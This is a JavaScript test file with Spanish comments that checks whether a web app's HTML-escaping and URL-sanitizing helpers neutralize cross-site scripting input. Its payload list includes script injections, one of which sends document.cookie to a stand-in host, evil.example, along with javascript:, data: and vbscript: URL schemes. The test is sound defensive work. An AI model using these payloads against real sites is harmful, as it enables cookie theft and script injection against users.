/**
 * Si comprometen el servicio de atestación, la respuesta llega envenenada.
 *
 * Es el escenario que más importa porque asume que el eslabón de confianza ya
 * cayó. El backend no puede distinguir una carga maliciosa del nombre de una
 * organización política legítima, así que la defensa tiene que estar en el
 * render. Estas cargas se registraron de verdad contra el servicio y llegaron
 * intactas hasta el navegador.
 *
 *   node tests/test_xss.js
 */

// Copias exactas de web/js/core/dom.js
const esc = v => String(v ?? '').replace(/[&<>"']/g, c => ({
  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
}[c]));

const safeUrl = value => {
  const raw = String(value ?? '').trim();
  try {
    const url = new URL(raw, 'https://example.org');
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return '';
    return esc(url.href);
  } catch { return ''; }
};

const PAYLOADS = [
  "<svg onload=alert('x')>",
  "<img src=x onerror=alert(document.domain)>",
  "\"><script>fetch('//evil.example/'+document.cookie)</script>",
  "</span><iframe src=//evil.example>",
  "' onmouseover='alert(1)",
  "<a href=\"javascript:alert(1)\">x</a>",
];

const URL_PAYLOADS = [
  "javascript:alert(1)",
  "JaVaScRiPt:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "vbscript:msgbox(1)",
  " javascript:alert(1)",
];

let failures = 0;
const fail = message => { console.error(`FALLO  ${message}`); failures++; };

// ── Texto y atributos: nada puede volver a ser una etiqueta ──
// Se comprueba que no quede NINGÚN "<" sin escapar, que es la única forma de
// abrir una etiqueta. Buscar "onerror" en el resultado daría falso positivo:
// aparece como texto inerte dentro de contenido ya escapado.
for (const payload of PAYLOADS) {
  for (const rendered of [
    `<span>${esc(payload)}</span>`,
    `<div title="${esc(payload)}">x</div>`,
  ]) {
    const inner = rendered.replace(/^<[^>]+>|<\/[a-z]+>$/g, '');
    if (/[<>"']/.test(inner)) fail(`carácter sin escapar en: ${payload}`);
  }
}

// ── URLs: esc() no alcanza, un javascript: no lleva comillas ──
for (const payload of URL_PAYLOADS) {
  const href = safeUrl(payload);
  if (href !== '') fail(`esquema peligroso aceptado: ${payload} -> ${href}`);
}

// ── Y las legítimas tienen que seguir pasando ──
for (const good of ['https://explorer.lacnet.com/tx/0xabc',
                    'https://ipfs.stamping.io/QmAbc',
                    '/peru/2026/api/records/x/pdf']) {
  if (safeUrl(good) === '') fail(`URL legítima rechazada: ${good}`);
}

console.log(failures === 0
  ? `  ok  ${PAYLOADS.length} cargas neutralizadas, ${URL_PAYLOADS.length} esquemas rechazados`
  : `  ${failures} fallos`);
process.exit(failures ? 1 : 0);
